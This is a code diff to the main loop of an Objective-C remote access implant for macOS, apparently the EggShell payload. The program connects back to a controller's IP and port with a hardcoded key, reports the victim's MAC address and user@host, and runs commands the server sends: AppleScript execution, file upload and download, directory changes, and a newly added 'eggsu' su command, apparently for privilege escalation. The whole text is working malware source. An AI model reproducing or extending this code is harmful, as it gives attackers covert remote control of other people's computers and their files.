@@ -11,10 +11,7 @@
 #import "eshelper.h"
 #import "espl.h"
 NSString *bkey = @"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV";
-NSString *logfile = @"/tmp/.esplog";
 espl *_espl;
-BOOL debug = false;
-
 //MARK: Main
 //log with this
 //system([[NSString stringWithFormat:@"echo '%@' >> /tmp/esplog",@"1"] UTF8String]);
@@ -38,11 +35,11 @@ int main(int argc, const char * argv[]) {
     int port = [[initDictionary objectForKey:@"port"] intValue];
     _espl.skey = [initDictionary objectForKey:@"key"];
     _espl.terminator = [initDictionary objectForKey:@"term"];
-    //debug = [[initDictionary objectForKey:@"debug"] boolValue];
+    debug = [[initDictionary objectForKey:@"debug"] boolValue];
     //connect
     int success = [_espl connect:ip :port];
     if (success == -1) {
-        if (debug) system([[NSString stringWithFormat:@"echo 'unable to connect %@ %d %@ %@' >> %@",ip,port,_espl.skey,_espl.terminator,logfile] UTF8String]);
+        if (debug) [_espl debugLog:[NSString stringWithFormat:@"%@ %d %@ %@",ip,port,_espl.skey,_espl.terminator]] ;
     }
     else {
         //send mac address, username@host info to server
@@ -61,7 +58,7 @@ int main(int argc, const char * argv[]) {
                 NSDictionary *receivedDictionary = [eshelper stringToJSON:command :decodeError];
                 //if there was an error with our input, a message is helpful
                 if (decodeError != nil) {
-                    if (debug) system([[NSString stringWithFormat:@"echo '%@' >> %@",command,logfile] UTF8String]);
+                    if (debug) [_espl debugLog:command];
                     [_espl sendString:[NSString stringWithFormat:@"%@",decodeError]];
                 }
                 //assign
@@ -70,11 +67,11 @@ int main(int argc, const char * argv[]) {
                 NSString *cmdType = [receivedDictionary objectForKey:@"type"];
                 _espl.terminator = [receivedDictionary objectForKey:@"term"];
                 
-                if (debug) system([[NSString stringWithFormat:@"echo '%@' >> %@",command,logfile] UTF8String]);
+                if (debug) [_espl debugLog:command];
                 
                 //APPLESCRIPTS
                 if ([cmdType isEqualToString:@"applescript"]) {
-                    [_espl runAppleScript:cmd];
+                    [_espl runAppleScript:cmd :cmdArgument];
                 }
                 //UPLOADS + DOWNLOADS
                 else if ([cmdType isEqualToString:@"upload"]) {
@@ -101,6 +98,10 @@ int main(int argc, const char * argv[]) {
                         [_espl sendFileData:rawdata];
                     }
                 }
+                else if ([cmdType isEqualToString: @"eggsu"]) {
+                    [_espl debugLog:@"type is eggsu"];
+                    [_espl su:cmdArgument:ip:port];
+                }
                 else if ([cmd isEqualToString: @"exit"]) {
                     exit(0);
                 }
@@ -116,14 +117,8 @@ int main(int argc, const char * argv[]) {
                 else if ([cmd isEqualToString: @"brightness"]) {
                     [_espl set_brightness:cmdArgument];
                 }
-                else if ([cmd isEqualToString: @"ls"]) {
-                    [_espl directoryList:cmdArgument];
-                }
                 else if ([cmd isEqualToString: @"cd"]) {
                     [_espl changeWD:cmdArgument];
-                }
-                else if ([cmd isEqualToString: @"rm"]) {
-                    [_espl rmFile:cmdArgument];
                 }
                 else if ([cmd isEqualToString: @"pwd"]) {
                     [_espl sendString:_espl.fileManager.currentDirectoryPath];
@@ -160,3 +155,13 @@ int main(int argc, const char * argv[]) {
     return 0;
 }
 
+
+
+/* depricated
+ else if ([cmd isEqualToString: @"ls"]) {
+    [_espl directoryList:cmdArgument];
+ }
+ else if ([cmd isEqualToString: @"rm"]) {
+    [_espl rmFile:cmdArgument];
+ }
+*/
